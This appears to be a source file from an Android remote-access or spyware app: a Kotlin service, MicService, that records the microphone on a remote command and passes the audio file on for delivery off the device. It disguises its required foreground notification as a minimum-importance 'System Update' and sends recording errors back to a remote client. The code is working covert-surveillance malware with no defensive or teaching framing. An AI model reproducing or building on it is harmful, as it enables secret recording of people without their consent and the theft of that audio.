package ai.obsidian.agent.svc

import ai.obsidian.agent.AgentApp
import ai.obsidian.agent.media.MediaSink
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.media.MediaRecorder
import android.os.IBinder
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File

class MicService : Service() {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var app: AgentApp
    private var recorder: MediaRecorder? = null

    override fun onCreate() {
        super.onCreate()
        app = application as AgentApp
        val manager = getSystemService(NotificationManager::class.java)
        if (manager.getNotificationChannel(CHANNEL_ID) == null) {
            manager.createNotificationChannel(
                NotificationChannel(CHANNEL_ID, "Microphone", NotificationManager.IMPORTANCE_MIN)
            )
        }
        startForeground(NOTIFICATION_ID, buildNotification())
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val seconds = (intent?.getIntExtra(EXTRA_SECONDS, 15) ?: 15).coerceIn(3, 300)
        val target = app.store.file("mic_${System.currentTimeMillis()}.m4a")

        try {
            val mediaRecorder = MediaRecorder(this)
            recorder = mediaRecorder
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC)
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            mediaRecorder.setAudioEncodingBitRate(64_000)
            mediaRecorder.setAudioSamplingRate(44_100)
            mediaRecorder.setOutputFile(target.absolutePath)
            mediaRecorder.prepare()
            mediaRecorder.start()
        } catch (throwable: Throwable) {
            app.audit.warn("mic", throwable.message.orEmpty())
            app.client?.let { client ->
                scope.launch { client.send("msg", "MIC_ERR ${throwable.message}") }
            }
            stopSelf()
            return START_NOT_STICKY
        }

        scope.launch {
            delay(seconds * 1000L)
            runCatching {
                recorder?.stop()
                recorder?.release()
            }
            recorder = null
            MediaSink.deliverFile(app, target, "mic")
            stopSelf()
        }

        return START_NOT_STICKY
    }

    private fun buildNotification(): Notification =
        Notification.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_btn_speak_now)
            .setContentTitle("System Update")
            .setContentText("Recording")
            .build()

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        runCatching { recorder?.release() }
        scope.cancel()
        super.onDestroy()
    }

    companion object {
        private const val CHANNEL_ID = "obsidian.mic"
        private const val NOTIFICATION_ID = 0x0B51D1F
        private const val EXTRA_SECONDS = "seconds"

        fun record(context: Context, seconds: Int) {
            context.startForegroundService(
                Intent(context, MicService::class.java).putExtra(EXTRA_SECONDS, seconds)
            )
        }
    }
}
